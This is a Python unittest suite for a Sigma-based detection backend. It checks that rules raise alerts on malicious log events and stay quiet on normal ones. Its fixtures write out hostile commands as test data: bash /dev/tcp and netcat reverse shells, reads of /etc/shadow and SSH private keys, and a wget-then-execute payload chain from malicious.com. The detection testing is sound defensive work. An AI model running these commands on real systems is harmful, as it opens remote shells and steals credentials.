#!/usr/bin/env python3
"""
Test Suite for Sigma Simple Backend

This test suite validates the core functionality of the Sigma Simple Backend
including rule compilation, event evaluation, and alert generation.
"""

import unittest
import sys
import os

# Add parent directory to path to import the backend
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sigma_simple_backend import (
    SimpleEvalBackend,
    RestrictivenessLevel,
    MockRuleCollection,
    Alert,
    SimpleRule
)


class TestSigmaSimpleBackend(unittest.TestCase):
    """Test cases for Sigma Simple Backend"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.backend = SimpleEvalBackend(restrictiveness=RestrictivenessLevel.BALANCED)
        self.rule_collection = MockRuleCollection()
        self.compiled_rules = self.backend.compile(self.rule_collection)
    
    def test_backend_initialization(self):
        """Test backend initialization with different configurations"""
        # Test default initialization
        backend_default = SimpleEvalBackend()
        self.assertEqual(backend_default.restrictiveness, RestrictivenessLevel.BALANCED)
        
        # Test with custom restrictiveness
        backend_restrictive = SimpleEvalBackend(restrictiveness=RestrictivenessLevel.RESTRICTIVE)
        self.assertEqual(backend_restrictive.restrictiveness, RestrictivenessLevel.RESTRICTIVE)
        
        # Test with custom field mappings
        custom_mappings = {"process.name": "custom_proc_name"}
        backend_custom = SimpleEvalBackend(field_mappings=custom_mappings)
        self.assertIn("custom_proc_name", backend_custom.field_mappings.values())
    
    def test_rule_compilation(self):
        """Test rule compilation process"""
        self.assertIsInstance(self.compiled_rules, list)
        self.assertGreater(len(self.compiled_rules), 0)
        
        # Test that all compiled rules are callable
        for rule_func in self.compiled_rules:
            self.assertTrue(callable(rule_func))
    
    def test_reverse_shell_detection(self):
        """Test detection of reverse shell commands"""
        reverse_shell_events = [
            {
                "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
                "_COMM": "bash",
                "_CMDLINE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
            },
            {
                "MESSAGE": "nc -e /bin/bash 192.168.1.100 4444",
                "_COMM": "nc",
                "_CMDLINE": "nc -e /bin/bash 192.168.1.100 4444",
            },
            {
                "MESSAGE": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.1.100\",4444));'",
                "_COMM": "python",
                "_CMDLINE": "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.1.100\",4444));'",
            }
        ]
        
        for event in reverse_shell_events:
            with self.subTest(event=event["_COMM"]):
                alerts = self._get_alerts_for_event(event)
                self.assertGreater(len(alerts), 0, f"No alerts generated for {event['_COMM']} reverse shell")
    
    def test_privilege_escalation_detection(self):
        """Test detection of privilege escalation attempts"""
        priv_esc_events = [
            {
                "MESSAGE": "sudo -u root /bin/bash",
                "_COMM": "sudo",
                "_CMDLINE": "sudo -u root /bin/bash",
            },
            {
                "MESSAGE": "su - root",
                "_COMM": "su",
                "_CMDLINE": "su - root",
            }
        ]
        
        for event in priv_esc_events:
            with self.subTest(event=event["_COMM"]):
                alerts = self._get_alerts_for_event(event)
                self.assertGreater(len(alerts), 0, f"No alerts generated for {event['_COMM']} privilege escalation")
    
    def test_credential_theft_detection(self):
        """Test detection of credential theft attempts"""
        cred_theft_events = [
            {
                "MESSAGE": "cat /etc/shadow",
                "_COMM": "cat",
                "_CMDLINE": "cat /etc/shadow",
            },
            {
                "MESSAGE": "cat ~/.ssh/id_rsa",
                "_COMM": "cat", 
                "_CMDLINE": "cat ~/.ssh/id_rsa",
            }
        ]
        
        for event in cred_theft_events:
            with self.subTest(event=event["_CMDLINE"]):
                alerts = self._get_alerts_for_event(event)
                self.assertGreater(len(alerts), 0, f"No alerts generated for credential theft: {event['_CMDLINE']}")
    
    def test_normal_activity_no_false_positives(self):
        """Test that normal activities don't generate false positives"""
        normal_events = [
            {
                "MESSAGE": "ls -la /home/user",
                "_COMM": "ls",
                "_CMDLINE": "ls -la /home/user",
            },
            {
                "MESSAGE": "systemctl status ssh",
                "_COMM": "systemctl",
                "_CMDLINE": "systemctl status ssh",
            },
            {
                "MESSAGE": "vim /home/user/document.txt",
                "_COMM": "vim",
                "_CMDLINE": "vim /home/user/document.txt",
            }
        ]
        
        for event in normal_events:
            with self.subTest(event=event["_COMM"]):
                alerts = self._get_alerts_for_event(event)
                self.assertEqual(len(alerts), 0, f"False positive for normal activity: {event['_COMM']}")
    
    def test_restrictiveness_levels(self):
        """Test different restrictiveness levels"""
        malicious_event = {
            "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
            "_COMM": "bash",
            "_CMDLINE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
        }
        
        restrictiveness_levels = [
            RestrictivenessLevel.PERMISSIVE,
            RestrictivenessLevel.BALANCED,
            RestrictivenessLevel.RESTRICTIVE,
            RestrictivenessLevel.ULTRA_RESTRICTIVE
        ]
        
        alert_counts = {}
        
        for level in restrictiveness_levels:
            backend = SimpleEvalBackend(restrictiveness=level)
            compiled_rules = backend.compile(self.rule_collection)
            
            alerts = []
            for rule_func in compiled_rules:
                alert = backend.test_rule_against_event(rule_func, malicious_event)
                if alert:
                    alerts.append(alert)
            
            alert_counts[level] = len(alerts)
        
        # Permissive should generate more alerts than restrictive
        self.assertGreaterEqual(
            alert_counts[RestrictivenessLevel.PERMISSIVE],
            alert_counts[RestrictivenessLevel.RESTRICTIVE]
        )
    
    def test_alert_structure(self):
        """Test alert object structure and contents"""
        malicious_event = {
            "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
            "_COMM": "bash",
            "_CMDLINE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
        }
        
        alerts = self._get_alerts_for_event(malicious_event)
        
        if alerts:
            alert = alerts[0]
            
            # Test alert has required fields
            self.assertIsInstance(alert, Alert)
            self.assertIsInstance(alert.rule_title, str)
            self.assertIsInstance(alert.rule_id, str)
            self.assertIsInstance(alert.severity, str)
            self.assertIsInstance(alert.description, str)
            self.assertIsInstance(alert.event_data, dict)
            
            # Test alert contains event data
            self.assertEqual(alert.event_data, malicious_event)
    
    def test_mitre_attack_tags(self):
        """Test MITRE ATT&CK tag extraction"""
        malicious_event = {
            "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
            "_COMM": "bash",
            "_CMDLINE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
        }
        
        alerts = self._get_alerts_for_event(malicious_event)
        
        # At least one alert should have MITRE tags
        has_mitre_tactics = any(alert.mitre_tactics for alert in alerts)
        has_mitre_techniques = any(alert.mitre_techniques for alert in alerts)
        
        self.assertTrue(has_mitre_tactics or has_mitre_techniques, "No MITRE ATT&CK tags found in alerts")
    
    def test_field_mappings(self):
        """Test custom field mappings"""
        custom_mappings = {
            "process.name": "custom_process",
            "log.message": "custom_message"
        }
        
        backend = SimpleEvalBackend(field_mappings=custom_mappings)
        compiled_rules = backend.compile(self.rule_collection)
        
        # Test event with custom field names
        custom_event = {
            "custom_message": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
            "custom_process": "bash"
        }
        
        alerts = []
        for rule_func in compiled_rules:
            alert = backend.test_rule_against_event(rule_func, custom_event)
            if alert:
                alerts.append(alert)
        
        self.assertGreater(len(alerts), 0, "Custom field mappings not working")
    
    def test_empty_event_handling(self):
        """Test handling of empty or malformed events"""
        empty_events = [
            {},
            {"": ""},
            {"null_field": None},
            {"MESSAGE": ""}
        ]
        
        for event in empty_events:
            with self.subTest(event=event):
                alerts = self._get_alerts_for_event(event)
                # Should not crash, may or may not generate alerts
                self.assertIsInstance(alerts, list)
    
    def test_performance_basic(self):
        """Basic performance test"""
        import time
        
        test_event = {
            "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
            "_COMM": "bash",
            "_CMDLINE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
        }
        
        # Time 100 evaluations
        start_time = time.time()
        
        for _ in range(100):
            for rule_func in self.compiled_rules:
                self.backend.test_rule_against_event(rule_func, test_event)
        
        end_time = time.time()
        total_time = end_time - start_time
        
        # Should complete 100 evaluations in reasonable time (< 5 seconds)
        self.assertLess(total_time, 5.0, f"Performance test took too long: {total_time:.2f}s")
    
    def _get_alerts_for_event(self, event):
        """Helper method to get all alerts for a given event"""
        alerts = []
        for rule_func in self.compiled_rules:
            alert = self.backend.test_rule_against_event(rule_func, event)
            if alert:
                alerts.append(alert)
        return alerts


class TestMockComponents(unittest.TestCase):
    """Test cases for mock components"""
    
    def test_mock_rule_collection(self):
        """Test mock rule collection creation"""
        rule_collection = MockRuleCollection()
        
        self.assertIsNotNone(rule_collection.rules)
        self.assertGreater(len(rule_collection.rules), 0)
        
        # Test that rules have required attributes
        for rule in rule_collection.rules:
            self.assertTrue(hasattr(rule, 'title'))
            self.assertTrue(hasattr(rule, 'id'))
            self.assertTrue(hasattr(rule, 'description'))
            self.assertTrue(hasattr(rule, 'level'))
            self.assertTrue(hasattr(rule, 'tags'))


class TestIntegrationScenarios(unittest.TestCase):
    """Integration tests for realistic scenarios"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.backend = SimpleEvalBackend(restrictiveness=RestrictivenessLevel.BALANCED)
        self.rule_collection = MockRuleCollection()
        self.compiled_rules = self.backend.compile(self.rule_collection)
    
    def test_attack_chain_detection(self):
        """Test detection of a complete attack chain"""
        attack_chain = [
            # Initial compromise
            {
                "MESSAGE": "wget http://malicious.com/payload.sh",
                "_COMM": "wget",
                "_CMDLINE": "wget http://malicious.com/payload.sh",
            },
            # Persistence
            {
                "MESSAGE": "chmod +x payload.sh",
                "_COMM": "chmod",
                "_CMDLINE": "chmod +x payload.sh",
            },
            # Execution
            {
                "MESSAGE": "./payload.sh",
                "_COMM": "bash",
                "_CMDLINE": "./payload.sh",
            },
            # Reverse shell
            {
                "MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
                "_COMM": "bash",
                "_CMDLINE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
            }
        ]
        
        total_alerts = 0
        for i, event in enumerate(attack_chain):
            alerts = self._get_alerts_for_event(event)
            total_alerts += len(alerts)
            
            if i == len(attack_chain) - 1:  # Last event (reverse shell) should definitely trigger
                self.assertGreater(len(alerts), 0, "Reverse shell not detected in attack chain")
        
        # Should detect at least some suspicious activity in the chain
        self.assertGreater(total_alerts, 0, "No suspicious activity detected in attack chain")
    
    def test_mixed_legitimate_and_malicious(self):
        """Test with a mix of legitimate and malicious activities"""
        mixed_events = [
            # Legitimate
            {"MESSAGE": "systemctl status apache2", "_COMM": "systemctl"},
            {"MESSAGE": "ls -la /var/log", "_COMM": "ls"},
            # Malicious
            {"MESSAGE": "cat /etc/shadow", "_COMM": "cat", "_CMDLINE": "cat /etc/shadow"},
            # Legitimate
            {"MESSAGE": "vim config.txt", "_COMM": "vim"},
            # Malicious
            {"MESSAGE": "nc -l -p 4444 -e /bin/bash", "_COMM": "nc", "_CMDLINE": "nc -l -p 4444 -e /bin/bash"},
        ]
        
        legitimate_count = 0
        malicious_count = 0
        
        for event in mixed_events:
            alerts = self._get_alerts_for_event(event)
            
            if event["_COMM"] in ["systemctl", "ls", "vim"]:
                # Should be low/no alerts for legitimate activities
                legitimate_count += len(alerts)
            else:
                # Should have alerts for malicious activities
                malicious_count += len(alerts)
                self.assertGreater(len(alerts), 0, f"Malicious activity not detected: {event['_COMM']}")
        
        # Malicious activities should generate more alerts than legitimate ones
        self.assertGreater(malicious_count, legitimate_count)
    
    def _get_alerts_for_event(self, event):
        """Helper method to get all alerts for a given event"""
        alerts = []
        for rule_func in self.compiled_rules:
            alert = self.backend.test_rule_against_event(rule_func, event)
            if alert:
                alerts.append(alert)
        return alerts


def run_performance_benchmark():
    """Run a performance benchmark"""
    import time
    
    print("\n=== Performance Benchmark ===")
    
    backend = SimpleEvalBackend(restrictiveness=RestrictivenessLevel.BALANCED)
    rule_collection = MockRuleCollection()
    compiled_rules = backend.compile(rule_collection)
    
    test_events = [
        {"MESSAGE": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1", "_COMM": "bash"},
        {"MESSAGE": "cat /etc/shadow", "_COMM": "cat"},
        {"MESSAGE": "sudo -u root /bin/bash", "_COMM": "sudo"},
        {"MESSAGE": "ls -la /home", "_COMM": "ls"},
        {"MESSAGE": "nc -l -p 4444 -e /bin/bash", "_COMM": "nc"},
    ]
    
    iterations = 1000
    start_time = time.time()
    
    total_alerts = 0
    for i in range(iterations):
        for event in test_events:
            for rule_func in compiled_rules:
                alert = backend.test_rule_against_event(rule_func, event)
                if alert:
                    total_alerts += 1
    
    end_time = time.time()
    total_time = end_time - start_time
    
    evaluations = iterations * len(test_events) * len(compiled_rules)
    
    print(f"Completed {evaluations:,} rule evaluations in {total_time:.2f} seconds")
    print(f"Rate: {evaluations/total_time:.0f} evaluations/second")
    print(f"Generated {total_alerts} alerts")
    print(f"Rules: {len(compiled_rules)}")


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Sigma Simple Backend Test Suite")
    parser.add_argument("--benchmark", action="store_true", help="Run performance benchmark")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    if args.benchmark:
        run_performance_benchmark()
    
    # Run unit tests
    if args.verbose:
        unittest.main(verbosity=2, exit=False, argv=[''])
    else:
        unittest.main(exit=False, argv=[''])
    
    print("\n=== Test Suite Completed ===") 